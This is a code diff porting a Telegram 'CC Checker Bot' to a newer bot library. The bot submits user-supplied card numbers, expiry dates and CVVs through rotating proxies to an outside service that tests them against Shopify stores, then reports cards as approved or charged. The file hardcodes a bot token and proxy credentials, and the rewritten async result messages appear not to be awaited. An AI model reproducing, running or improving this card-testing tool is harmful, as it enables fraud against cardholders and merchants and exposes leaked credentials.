@@ -3,9 +3,11 @@ import time
 import threading
 import random
 import urllib.parse
+import asyncio
 import requests
-import telebot
 from typing import List
+from telegram import Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ===================== CONFIG =====================
 BOT_TOKEN = "8854554558:AAGKqtF4BimDmTLbXqy9_czvHEvr5iMNse8"
@@ -137,7 +139,7 @@ proxy_list = [
     "mk11pf7kl2ze:wu8ip7aechl7pp5@209.50.181.80:3129"
 ]
 
-bot = telebot.TeleBot(BOT_TOKEN)
+# State tracking
 user_check_in_progress = {}
 last_check_time = {}
 
@@ -172,7 +174,7 @@ def bin_lookup(bin_code):
                 "level": data.get("level", "N/A"),
                 "bank": data.get("bank", "N/A"),
                 "country": data.get("country_name", "N/A"),
-                "country_emoji": data.get("country_flag", "ðŸ³ï¸")
+                "country_emoji": data.get("country_flag", "🏳️")
             }
     except:
         pass
@@ -182,7 +184,7 @@ def bin_lookup(bin_code):
         "level": "N/A",
         "bank": "N/A",
         "country": "N/A",
-        "country_emoji": "ðŸ³ï¸"
+        "country_emoji": "🏳️"
     }
 
 def format_result(card, api_json, user, user_id, elapsed):
@@ -214,62 +216,62 @@ def format_result(card, api_json, user, user_id, elapsed):
     ]
 
     if any(x in status_lower or x in response_lower for x in declined_phrases):
-        status_str = "ðƒðžðœð¥ð¢ð§ðžð âŒ"
+        status_str = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
         response_show = response_msg
     elif any(x in response_lower for x in [
         "3d", "authentication", "3d secure", "OTP_REQUIRED", "3ds", "otp", "verify", "verification"
     ]):
-        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
         response_show = response_msg
     elif "insufficient" in response_lower or "low funds" in response_lower:
-        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
         response_show = response_msg
     elif "incorrect_zip" in response_lower:
-        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
         response_show = response_msg
     elif any(x in response_lower for x in [
         "incorrect cvc", "invalid cvc", "incorrect cvv", "incorrect_cvc",
         "INSUFFICIENT_FUNDS", "invalid cvv", "incorrect security code",
         "invalid security code"
     ]):
-        status_str = "ð€ð©ð©ð«ð¨ð¯ðžð âœ…"
+        status_str = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
         response_show = response_msg
     elif any(x in response_lower for x in [
-        "thank you", "order placed", "charged", "â¤¿ORDER_PAIDâ¤¾",
+        "thank you", "order placed", "charged", "⤿ORDER_PAID⤾",
         "successfully paid", "payment successful"
     ]):
-        status_str = "ð‚ð¡ðšð«ð ðžð ðŸ’Ž"
+        status_str = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 💎"
         response_show = response_msg
     else:
         approved_phrases = ["approved", "charged", "success", "live", "approved!"]
         is_approved = any(p in status_lower for p in approved_phrases)
-        status_str = f"{esc(status)} {'âœ…' if is_approved else 'âŒ'}"
+        status_str = f"{esc(status)} {'✅' if is_approved else '❌'}"
         response_show = response_msg
 
     link = "https://t.me/NIKSHACKS"
     b = lambda t: f"<b>{t}</b>"
     m = lambda t: f"<code>{t}</code>"
-    ks = f'<a href="{link}">ÏŸ</a>'
-    su = f'<a href="{link}">ã‚¹</a>'
-    curl = f'<a href="{link}">âŒ¯</a>'
+    ks = f'<a href="{link}">ϟ</a>'
+    su = f'<a href="{link}">ス</a>'
+    curl = f'<a href="{link}">⌯</a>'
 
     text = (
         f"{b('#Shopi | Luffy [/sh]')}\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"━━━━━━━━━━━━━\n"
         f"{b(f'[{ks}] Card:')} {m(card)}\n"
         f"{b(f'[{ks}] Gateway:')} {m(f'{gateway} {amount}')}\n"
         f"{b(f'[{ks}] Status:')} {m(esc(status_str))}\n"
         f"{b(f'[{ks}] Response:')} {m(esc(response_show))}\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"━━━━━━━━━━━━━\n"
         f"{b(f'[{curl}] Bin:')} {m(bin_code)}\n"
         f"{b(f'[{curl}] Info:')} {m(bininfo['brand'] + ' - ' + bininfo['type'] + ' - ' + bininfo['level'])}\n"
         f"{b(f'[{curl}] Bank:')} {m(bininfo['bank'])}\n"
         f"{b(f'[{curl}] Country:')} {m(bininfo['country'] + ' - ' + bininfo['country_emoji'])}\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
+        f"━━━━━━━━━━━━━\n"
         f'{b(f"[{su}] Checked By:")} <a href="tg://user?id={user_id}">{esc(user)}</a>\n'
-        f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - â˜˜ï¸</a>\n"
-        f"â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
-        f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live ðŸŒ¥]')}"
+        f"{b(f'[{su}] Dev:')} <a href=\"tg://user?id=8570832903\">Luffy - ☘️</a>\n"
+        f"━━━━━━━━━━━━━\n"
+        f"{b(f'[{ks}] T/t:')} {m(f'[{elapsed:.2f}sec] | P/x: [Live 🌥]')}"
     )
     return text
 
@@ -310,18 +312,16 @@ def extract_cards_from_text(text: str) -> List[str]:
                     cards.append(card_string)
     return cards
 
-# ===================== BOT COMMAND HANDLERS =====================
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    bot.reply_to(message, "Welcome to the CC Checker Bot! Use /sh to check a card.")
+# ===================== BOT HANDLERS (async) =====================
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Welcome to the CC Checker Bot! Use /sh to check a card.")
 
-@bot.message_handler(func=lambda m: m.text and (m.text.startswith('/sh') or m.text.startswith('.sh')))
-def check_card(message):
-    uid = str(message.from_user.id)
-    username = (message.from_user.username or "").lower()
+async def sh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    uid = str(user.id)
 
     if user_check_in_progress.get(uid, False):
-        bot.reply_to(message, "â³ á´˜ÊŸá´‡á´€êœ±á´‡ á´¡á´€Éªá´›: Êá´á´œÊ€ ÊŸá´€êœ±á´› á´„Êœá´‡á´„á´‹ Éªêœ± êœ±á´›ÉªÊŸÊŸ á´˜Ê€á´á´„á´‡êœ±êœ±ÉªÉ´É¢.")
+        await update.message.reply_text("⏳ ᴘʟᴇᴀꜱᴇ ᴡᴀɪᴛ: ʏᴏᴜʀ ʟᴀꜱᴛ ᴄʜᴇᴄᴋ ɪꜱ ꜱᴛɪʟʟ ᴘʀᴏᴄᴇꜱꜱɪɴɢ.")
         return
 
     now = time.time()
@@ -329,31 +329,28 @@ def check_card(message):
     cooldown = 0
     if now - last_end < cooldown:
         wait_sec = int(cooldown - (now - last_end))
-        bot.reply_to(message, f"â³ á´¡ÊœÊ êœ±á´ Êœá´œÊ€Ê€Ê? á´¡á´€Éªá´› {wait_sec}sâ€¦")
+        await update.message.reply_text(f"⏳ ᴡʜʏ ꜱᴏ ʜᴜʀʀʏ? ᴡᴀɪᴛ {wait_sec}s…")
+        return
+
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ ᴜꜱᴀɢᴇ: /ꜱʜ [ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ]")
+        return
+
+    card = args[0].replace(" ", "")
+    if not is_valid_card(card):
+        await update.message.reply_text("❌ ɪɴᴠᴀʟɪᴅ ᴄᴀʀᴅ ꜰᴏʀᴍᴀᴛ. ᴜꜱᴇ ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ")
         return
 
     user_check_in_progress[uid] = True
-
-    args = message.text.split(maxsplit=1)
-    if len(args) != 2:
-        bot.reply_to(message, "âŒ á´œêœ±á´€É¢á´‡: /êœ±Êœ [á´„á´„|á´á´|ÊÊ|á´„á´ á´ ]")
-        user_check_in_progress[uid] = False
-        return
-
-    card = args[1].replace(" ", "")
-    if not is_valid_card(card):
-        bot.reply_to(message, "âŒ ÉªÉ´á´ á´€ÊŸÉªá´… á´„á´€Ê€á´… êœ°á´Ê€á´á´€á´›. á´œêœ±á´‡ á´„á´„|á´á´|ÊÊ|á´„á´ á´ ")
-        user_check_in_progress[uid] = False
-        return
-
-    status_msg = bot.reply_to(message, "Êá´á´œÊ€ Ê€á´‡Qá´œá´‡êœ±á´› Ê€á´‡á´„á´‡Éªá´ á´‡á´…!")
+    status_msg = await update.message.reply_text("ʏᴏᴜʀ ʀᴇQᴜᴇꜱᴛ ʀᴇᴄᴇɪᴠᴇᴅ!")
     t0 = time.time()
 
     def process_check():
         try:
             max_attempts = 3
-            last_error = None
             response = None
+            last_error = None
 
             for attempt in range(max_attempts):
                 try:
@@ -364,7 +361,7 @@ def check_card(message):
                     shop_url = random.choice(shop_urls)
                     api_url = f"https://nik.cards/shopify?site={shop_url}&cc={card}&proxy={proxy_param}"
 
-                    # No outer proxy â€“ the proxy is only passed as a parameter
+                    # Direct connection; proxy is only passed as parameter
                     response = requests.get(api_url, timeout=30)
                     break
                 except Exception as e:
@@ -379,39 +376,45 @@ def check_card(message):
                 api_json = {"Response": response.text}
 
             elapsed = time.time() - t0
-            user_display = message.from_user.username or message.from_user.first_name
+            user_display = user.username or user.first_name
             result_text = format_result(
                 card, api_json,
                 user=user_display,
-                user_id=message.from_user.id,
+                user_id=user.id,
                 elapsed=elapsed
             )
 
-            bot.edit_message_text(
+            # Edit the status message with the result
+            context.bot.edit_message_text(
                 result_text,
-                chat_id=status_msg.chat.id,
+                chat_id=status_msg.chat_id,
                 message_id=status_msg.message_id,
                 parse_mode='HTML'
             )
 
         except Exception as e:
-            bot.edit_message_text(
-                f"âŒ Error: {str(e)}",
-                chat_id=status_msg.chat.id,
+            context.bot.edit_message_text(
+                f"❌ Error: {str(e)}",
+                chat_id=status_msg.chat_id,
                 message_id=status_msg.message_id
             )
         finally:
             user_check_in_progress[uid] = False
             last_check_time[uid] = time.time()
 
-    threading.Thread(target=process_check, daemon=True).start()
+    # Run blocking check in a separate thread to not block the async loop
+    loop = asyncio.get_event_loop()
+    await loop.run_in_executor(None, process_check)
 
-# ===================== BOT POLLING =====================
-if __name__ == "__main__":
+# ===================== MAIN =====================
+def main():
+    application = Application.builder().token(BOT_TOKEN).build()
+
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("sh", sh_command))
+
     print("Bot started...")
-    while True:
-        try:
-            bot.polling(none_stop=True, timeout=60)
-        except Exception as e:
-            print(f"Polling error: {e}")
-            time.sleep(5)
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == "__main__":
+    main()
